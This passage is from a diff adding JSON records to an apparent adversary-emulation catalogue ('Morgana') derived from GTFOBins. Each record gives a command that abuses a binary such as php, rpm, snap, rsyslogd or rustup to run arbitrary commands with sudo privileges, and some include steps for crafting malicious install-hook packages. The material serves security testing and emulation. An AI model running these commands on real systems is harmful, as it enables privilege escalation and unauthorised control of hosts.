+        "inherited_from": "less",
+        "inheritance_path": [
+          "man",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "man",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:man:command:1:sudo:0:man>less",
+        "source_name": "man",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `man` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:nohup:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - nohup - Command - Sudo [28ac24e]",
+      "description": "This executable can run non-interactive system commands. Binary: nohup. Context: Sudo. The `nohup.out` file contains the standard output and error of the command.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "nohup /path/to/command\ncat nohup.out",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/nohup",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/nohup",
+        "source_bin": "nohup",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:nohup:command:0:sudo::",
+        "source_name": "nohup",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `nohup` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:opencode:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - opencode - Command - Sudo [8726b6a]",
+      "description": "This executable can run non-interactive system commands. Binary: opencode. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "opencode\n! /path/to/command",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/opencode",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/opencode",
+        "source_bin": "opencode",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:opencode:command:0:sudo::",
+        "source_name": "opencode",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `opencode` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:openvt:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - openvt - Command - Sudo [7a349be]",
+      "description": "This executable can run non-interactive system commands. Binary: openvt. Context: Sudo. The command execution is displayed on the virtual console.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "openvt -- /path/to/command",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/openvt",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/openvt",
+        "source_bin": "openvt",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:openvt:command:0:sudo::",
+        "source_name": "openvt",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `openvt` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:php:command:2:sudo::",
+      "name": "GTFOBINS - T1059 - php - Command - Sudo [8f75d3c]",
+      "description": "This executable can run non-interactive system commands. Binary: php. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "php -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(\"/path/to/command\", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/php",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/php",
+        "source_bin": "php",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 2,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:php:command:2:sudo::",
+        "source_name": "php",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `php` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:php:command:1:sudo::",
+      "name": "GTFOBINS - T1059 - php - Command - Sudo [c8d9cf9]",
+      "description": "This executable can run non-interactive system commands. Binary: php. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "php -r '$r=array(); exec(\"/path/to/command\", $r); print(join(\"\\n\",$r));'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/php",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/php",
+        "source_bin": "php",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:php:command:1:sudo::",
+        "source_name": "php",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `php` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:php:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - php - Command - Sudo [4eed7a7]",
+      "description": "This executable can run non-interactive system commands. Binary: php. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "php -r 'echo shell_exec(\"/path/to/command\");'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/php",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/php",
+        "source_bin": "php",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:php:command:0:sudo::",
+        "source_name": "php",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `php` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:pkg:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - pkg - Command - Sudo [09b62aa]",
+      "description": "This executable can run non-interactive system commands. Binary: pkg. Context: Sudo. Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo /path/to/command >x.sh fpm -n x -s dir -t freebsd -a all --before-install x.sh . ```",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "pkg install -y --no-repo-update ./x-1.0.txz",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/pkg",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/pkg",
+        "source_bin": "pkg",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:pkg:command:0:sudo::",
+        "source_name": "pkg",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `pkg` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:procmail:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - procmail - Command - Sudo [bd445fa]",
+      "description": "This executable can run non-interactive system commands. Binary: procmail. Context: Sudo. The program is picky about the file ownership, and waits for some input.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo -e ':0\\n| /path/to/command >#{lotl_gtfobins_local_path}\nprocmail -m #{lotl_gtfobins_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/procmail",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/procmail",
+        "source_bin": "procmail",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": false
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:procmail:command:0:sudo::",
+        "source_name": "procmail",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `procmail` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:psql:command:1:sudo:0:psql>less",
+      "name": "GTFOBINS - T1059 - psql - Command - Sudo [449b688]",
+      "description": "This executable can run non-interactive system commands. Binary: psql. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "psql\n\\?\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/psql",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/psql",
+        "source_bin": "psql",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "psql",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "psql",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:psql:command:1:sudo:0:psql>less",
+        "source_name": "psql",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `psql` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:restic:command:1:sudo::",
+      "name": "GTFOBINS - T1059 - restic - Command - Sudo [6c1057b]",
+      "description": "This executable can run non-interactive system commands. Binary: restic. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "restic --password-command='/path/to/command' backup",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/restic",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/restic",
+        "source_bin": "restic",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:restic:command:1:sudo::",
+        "source_name": "restic",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `restic` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:restic:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - restic - Command - Sudo [33fca2e]",
+      "description": "This executable can run non-interactive system commands. Binary: restic. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/restic",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/restic",
+        "source_bin": "restic",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:restic:command:0:sudo::",
+        "source_name": "restic",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `restic` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpm:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - rpm - Command - Sudo [2ed74ca]",
+      "description": "This executable can run non-interactive system commands. Binary: rpm. Context: Sudo. Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo /path/to/command >x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ```",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpm -ivh x-1.0-1.noarch.rpm",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpm",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpm",
+        "source_bin": "rpm",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpm:command:0:sudo::",
+        "source_name": "rpm",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `rpm` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rsyslogd:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - rsyslogd - Command - Sudo [93e09bb]",
+      "description": "This executable can run non-interactive system commands. Binary: rsyslogd. Context: Sudo. In order for this to work, one must be able to trigger one event containing the chosen string, e.g., `somerandomstring`. One possibility is to attempt to connect to the victim host via SSH, for example: ``` ssh somerandomstring@victim.com ```",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "cat >#{lotl_gtfobins_local_path} <<EOF\nmodule(load=\"imuxsock\")\n:msg, contains, \"somerandomstring\" ^/path/to/command\nEOF\n\nrsyslogd -f #{lotl_gtfobins_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rsyslogd",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rsyslogd",
+        "source_bin": "rsyslogd",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rsyslogd:command:0:sudo::",
+        "source_name": "rsyslogd",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `rsyslogd` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:run-mailcap:command:1:sudo:0:run-mailcap>less",
+      "name": "GTFOBINS - T1059 - run-mailcap - Command - Sudo [10e4ec3]",
+      "description": "This executable can run non-interactive system commands. Binary: run-mailcap. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "run-mailcap --action=view text/plain:/etc/hosts\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/run-mailcap",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/run-mailcap",
+        "source_bin": "run-mailcap",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "run-mailcap",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "run-mailcap",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:run-mailcap:command:1:sudo:0:run-mailcap>less",
+        "source_name": "run-mailcap",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `run-mailcap` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rustc:command:1:sudo:0:rustc>less",
+      "name": "GTFOBINS - T1059 - rustc - Command - Sudo [4f36af8]",
+      "description": "This executable can run non-interactive system commands. Binary: rustc. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rustc --explain E0001\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rustc",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rustc",
+        "source_bin": "rustc",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "rustc",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "rustc",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rustc:command:1:sudo:0:rustc>less",
+        "source_name": "rustc",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `rustc` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rustup:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - rustup - Command - Sudo [dd2a398]",
+      "description": "This executable can run non-interactive system commands. Binary: rustup. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "mkdir /path/to/temp-dir/bin/\nmkdir /path/to/temp-dir/lib/\necho '/path/to/command' >/path/to/temp-dir/bin/rustc\nchmod +x /path/to/temp-dir/bin/rustc\nrustup toolchain link x /path/to/temp-dir/\nrustup run x rustc",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rustup",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rustup",
+        "source_bin": "rustup",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rustup:command:0:sudo::",
+        "source_name": "rustup",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `rustup` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:snap:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - snap - Command - Sudo [21f3bee]",
+      "description": "This executable can run non-interactive system commands. Binary: snap. Context: Sudo. Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` mkdir -p meta/hooks echo -e '#!/bin/sh\\n/path/to/command; false' >meta/hooks/install chmod +x meta/hooks/install fpm -n xxxx -s dir -t snap -a all meta ```",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "snap install xxxx_1.0_all.snap --dangerous --devmode",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/snap",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/snap",
+        "source_bin": "snap",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:snap:command:0:sudo::",
+        "source_name": "snap",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `snap` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:sshfs:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - sshfs - Command - Sudo [c5b4b66]",
+      "description": "This executable can run non-interactive system commands. Binary: sshfs. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "sshfs -o ssh_command=/path/to/command x: /path/to/dir/",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/sshfs",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/sshfs",
+        "source_bin": "sshfs",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
